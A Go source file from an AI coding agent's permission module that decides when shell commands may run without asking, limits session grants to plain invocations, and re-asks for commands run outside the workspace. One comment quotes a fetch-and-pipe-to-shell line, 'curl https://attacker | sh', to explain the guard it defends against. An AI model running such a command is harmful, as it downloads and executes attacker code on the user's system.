package permission

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/tidwall/gjson"

	"github.com/hijera/foxxycode-agent/internal/tooling"
)

// CommandAllowedWithSession reports whether a command may run without asking,
// given the operator's config allowlist and the grants collected in this
// session's permission dialogs.
//
// The two are deliberately not merged into one prefix match. A config entry is
// operator-authored and keeps its documented meaning. A session grant, by
// contrast, was created by clicking a button about one specific command, so it
// only extends to a candidate that is itself a single plain invocation:
// approving "curl https://trusted" must never end up authorising
// "curl https://attacker | sh", which a bare prefix match would allow.
func CommandAllowedWithSession(env *tooling.Env, sessionCmdGrants []string, cmd string) bool {
	if env != nil && env.CommandAllowed(cmd) {
		return true
	}
	return sessionGrantAllows(sessionCmdGrants, cmd)
}

// sessionGrantAllows matches a command against session grants. An exact match
// always counts, because that is precisely what the operator approved. A prefix
// match additionally requires the candidate to carry no shell metacharacters,
// so a widened grant cannot be used to smuggle in a second command.
func sessionGrantAllows(grants []string, cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}
	plain := isPlainInvocation(cmd)
	for _, grant := range grants {
		grant = strings.TrimSpace(grant)
		if grant == "" {
			continue
		}
		if grant == cmd {
			return true
		}
		if plain && strings.HasPrefix(cmd, grant+" ") {
			return true
		}
	}
	return false
}

// PromptBody returns UI text for a permission dialog (optional permission_rationale JSON field).
func PromptBody(toolName, inputJSON string) string {
	r := strings.TrimSpace(gjson.Get(inputJSON, "permission_rationale").String())
	// A command that names its directory shows it even with a rationale: the
	// place a command runs is part of what the operator approves.
	if cwd := strings.TrimSpace(gjson.Get(inputJSON, "cwd").String()); toolName == "run_command" && cwd != "" {
		if r != "" {
			return r + "\n\nDirectory: " + cwd
		}
		return "Directory: " + cwd + "\n" + fmt.Sprintf("Arguments: %s", inputJSON)
	}
	if r != "" {
		return r
	}
	return fmt.Sprintf("Arguments: %s", inputJSON)
}

// RunCommandCWDOutside reports whether a run_command's cwd names a directory
// outside the workspace it runs under. An omitted or empty cwd is the workspace
// itself. A relative cwd resolves against the workspace, so one that climbs out
// with ".." is outside too. Symlinks and junctions are resolved as well: the
// command runs at their target, so that target is what the grant must cover.
// With no workspace known, any cwd counts as outside: a grant cannot then vouch
// for the directory.
//
// A session grant approves a command, not the place it runs; the caller uses
// this to ask again for a command that would run elsewhere on disk.
func RunCommandCWDOutside(workspace, argsJSON string) bool {
	var args struct {
		CWD string `json:"cwd"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return false
	}
	cwd := strings.TrimSpace(args.CWD)
	if cwd == "" || cwd == "." {
		return false
	}
	if strings.TrimSpace(workspace) == "" {
		return true
	}
	ws := filepath.Clean(workspace)
	target := cwd
	if !filepath.IsAbs(target) {
		target = filepath.Join(ws, target)
	}
	target = filepath.Clean(target)
	ws = resolveCWDPath(ws)
	target = resolveCWDPath(target)
	rel, err := filepath.Rel(ws, target)
	if err != nil {
		return true
	}
	return rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) || filepath.IsAbs(rel)
}

func resolveCWDPath(path string) string {
	return resolveCWDPathDepth(path, 0)
}

func resolveCWDPathDepth(path string, depth int) string {
	if depth > 255 {
		return filepath.Clean(path)
	}
	if target, err := os.Readlink(path); err == nil {
		if !filepath.IsAbs(target) {
			target = filepath.Join(filepath.Dir(path), target)
		}
		return resolveCWDPathDepth(target, depth+1)
	}
	if resolved, err := filepath.EvalSymlinks(path); err == nil {
		parent := filepath.Dir(resolved)
		if parent == resolved {
			return resolved
		}
		return filepath.Join(resolveCWDPathDepth(parent, depth+1), filepath.Base(resolved))
	}
	parent := filepath.Dir(path)
	if parent == path {
		return filepath.Clean(path)
	}
	return filepath.Join(resolveCWDPathDepth(parent, depth+1), filepath.Base(path))
}

// ExtractRunCommand returns the shell command from run_command JSON args.
func ExtractRunCommand(argsJSON string) string {
	var args struct {
		Command string `json:"command"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return ""
	}
	return strings.TrimSpace(args.Command)
}
